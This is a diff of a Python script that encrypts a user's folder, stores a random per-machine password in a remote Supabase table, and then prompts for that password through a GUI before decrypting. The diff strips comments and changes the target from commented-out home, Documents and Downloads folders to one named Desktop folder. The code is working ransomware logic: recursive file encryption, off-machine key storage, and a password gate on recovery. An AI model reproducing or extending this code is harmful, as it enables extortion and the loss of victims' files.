@@ -33,12 +33,10 @@ def generate_key(password: str, salt: bytes) -> bytes:
 def get_or_create_user_id() -> str:
     id_file = os.path.expanduser("~/.user_id")
 
-    # If already generated, load it
     if os.path.exists(id_file):
         with open(id_file, 'r') as f:
             return f.read().strip()
 
-    # Otherwise, generate and save it
     base_name = platform.node()
     unique_suffix = str(uuid.uuid4())
     user_id = f"{base_name}_{unique_suffix}"
@@ -88,7 +86,6 @@ def validate_password(file_path: str, password: str) -> bool:
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
 
-        # Try unpadding
         unpadder = padding.PKCS7(128).unpadder()
         _ = unpadder.update(decrypted_data) + unpadder.finalize()
 
@@ -96,7 +93,6 @@ def validate_password(file_path: str, password: str) -> bool:
     except Exception:
         return False
 
-# Decrypt a single file
 def decrypt_file(file_path: str, password: str):
     with open(file_path, 'rb') as f:
         salt = f.read(16)
@@ -115,7 +111,6 @@ def decrypt_file(file_path: str, password: str):
     with open(file_path, 'wb') as dec_file:
         dec_file.write(original_data)
 
-# Recursively decrypt a folder
 def decrypt_directory(directory_path: str, password: str):
     for root, _, files in os.walk(directory_path):
         for file in files:
@@ -126,35 +121,28 @@ def decrypt_directory(directory_path: str, password: str):
             except Exception as e:
                 print(f"[!] Failed to decrypt {file_path}: {e}")
 
-    # ✅ Remove flag to allow re-encryption if needed
     encrypted_flag = os.path.join(directory_path, ".encrypted_flag")
     if os.path.exists(encrypted_flag):
         os.remove(encrypted_flag)
         print("[*] Encryption flag removed.")
-               	
 
-# ---------- Supabase Password for Machine/User ----------
 def get_or_create_user_password(user_id: str) -> str:
-    # Try to retrieve existing password for this machine
     result = supabase.table("encryption_keys").select("*").eq("user_id", user_id).execute()
     if result.data:
         return result.data[0]['password']
 
-    # Create new password
     new_password = secrets.token_urlsafe(16)
     supabase.table("encryption_keys").insert({"user_id": user_id, "password": new_password}).execute()
     return new_password
 
-# ---------- GUI for Password Input ----------
 def ask_for_password():
     user_password = None
 
     def on_submit():
-        nonlocal user_password  # Access outer function's variable
+        nonlocal user_password
         user_password = password_entry.get()
-        window.destroy()  # Close the window
+        window.destroy()
 
-    # Create the Tkinter window
     window = tk.Tk()
     window.title("Enter Decryption Password")
     window.geometry("300x150")
@@ -168,67 +156,50 @@ def ask_for_password():
 
     window.mainloop()
 
-    return user_password    # Return the entered password after window closes
-
+    return user_password
 
 # ---------- Main Script ----------
 if __name__ == "__main__":
-    # Identify the user/machine
     user_id = get_or_create_user_id()
     print(f"Using unique user ID: {user_id}")
 
-    # Get the user's encryption password
     password = get_or_create_user_password(user_id)
 
-    # Define target folders
-    # home = os.path.expanduser("~")
-    # target_dirs = [
-    #     home,
-    #     os.path.join(home, "Desktop"),
-    #     os.path.join(home, "Documents"),
-    #     os.path.join(home, "Downloads")
-    # ]
+    # Search only the Desktop for the "personal_Fa0337" folder
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    target_folder = None
 
-    # # Encrypt all files in each folder
-    # for path in target_dirs:
-    #     if os.path.exists(path):
-    #         print(f"Encrypting: {path}")
-    #         encrypt_directory(path, password)
-    #     else:
-    #         print(f"Not found: {path}")
+    for root, dirs, files in os.walk(desktop_path):
+        if "personal_Fa0337" in dirs:
+            target_folder = os.path.join(root, "personal_Fa0337")
+            break
 
-    target_folder = "personal_Fa0337"
-    encrypted_flag_path = os.path.join(target_folder, ".encrypted_flag")
-
-    if not os.path.exists(target_folder):
-        print(f"Folder not found: {target_folder}")
+    if not target_folder:
+        print("Folder 'personal_Fa0337' not found.")
     else:
+        encrypted_flag_path = os.path.join(target_folder, ".encrypted_flag")
         if not os.path.exists(encrypted_flag_path):
             print("🔐 Encrypting files...")
             encrypt_directory(target_folder, password)
 
-            # Create flag file to prevent re-encryption
             with open(encrypted_flag_path, "w") as f:
                 f.write("ENCRYPTED")
             print("✅ Done encrypting.")
         else:
             print("🔁 Files already encrypted. Skipping encryption.")
+
     print("Encryption completed for user:", user_id)
     
-    # Open Tkinter window for password input (simulating a decryption attempt)
     print("Password is required to decrypt the files.")
     user_password = ask_for_password()
 
-    # Validate the password by attempting to decrypt one of the files (you can validate this by running the decryption function in the background)
     if not user_password:
         print("No password entered. Exiting...")
         sys.exit(1)
 
-    # For now, you would just print or use a decryption check here (we'll use the decryption function in the background)
     print("Decryption password entered:", user_password)
 
-    # Validate against one file
-    directory_to_decrypt = "personal_Fa0337"
+    directory_to_decrypt = target_folder
     first_file = None
     for root, _, files in os.walk(directory_to_decrypt):
         if files:
@@ -239,7 +210,6 @@ if __name__ == "__main__":
         print("[ERROR] No files found in the directory.")
         sys.exit(1)
 
-    # Try password
     if validate_password(first_file, user_password):
         decrypt_directory(directory_to_decrypt, user_password)
         print("✅ Decryption complete.")
